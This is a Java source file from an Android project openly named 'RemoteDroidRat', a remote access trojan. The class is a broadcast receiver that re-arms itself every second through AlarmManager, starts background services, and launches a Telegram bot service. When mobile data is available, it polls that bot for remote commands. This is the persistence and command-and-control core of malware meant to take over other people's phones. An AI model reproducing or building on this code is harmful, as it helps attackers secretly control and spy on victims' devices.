package com.KaranKumar.RemoteDroidRat.broadcasts;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import android.widget.Toast;

import com.KaranKumar.RemoteDroidRat.services.background;
import com.KaranKumar.RemoteDroidRat.services.myNotification;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotService;
import android.net.NetworkInfo;
import android.net.ConnectivityManager;
import com.KaranKumar.RemoteDroidRat.telegramBot.telegramBotCmd.TelegramBotCmdApi;
import androidx.appcompat.view.ContextThemeWrapper;

public class alarmManager extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

		alarm(context);
        // Start your services here using startForegroundService
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            /*  
			 Intent serviceIntent = new Intent(context, background.class);
			 context.startForegroundService(serviceIntent);

			 Intent serviceNotification = new Intent(context, myNotification.class);
			 context.startForegroundService(serviceNotification);

			 Intent clickerService = new Intent(context, com.KaranKumar.RemoteDroidRat.services.SmartClickService.class);
			 context.startForegroundService(clickerService);
			 */
        } else {
            // Use the old method for versions prior to Oreo
            Intent serviceIntent = new Intent(context, background.class);
            context.startService(serviceIntent);

            Intent serviceNotification = new Intent(context, myNotification.class);
            context.startService(serviceNotification);

            

			Intent serviceBotApi = new Intent(context, TelegramBotService.class);
			context.startService(serviceBotApi);
        }

		if (isNetworkConnected(context)) {

			TelegramBotCmdApi tCmd = new TelegramBotCmdApi(context);
			tCmd.startCheckingMessages();
		}
    }

    public void alarm(Context context) {
        // Set up AlarmManager
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent alarmIntent = new Intent(context, alarmManager.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, alarmIntent, 0);

        // Set the repeating alarm
        long intervalMillis = 1000; // Set your desired interval
        long triggerTimeMillis = SystemClock.elapsedRealtime() + intervalMillis;

        if (alarmManager != null) {
            alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
											 triggerTimeMillis, intervalMillis, pendingIntent);
        }

        Toast.makeText(context, "Service is running", Toast.LENGTH_SHORT).show();
    }

	private boolean isNetworkConnected(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }


}
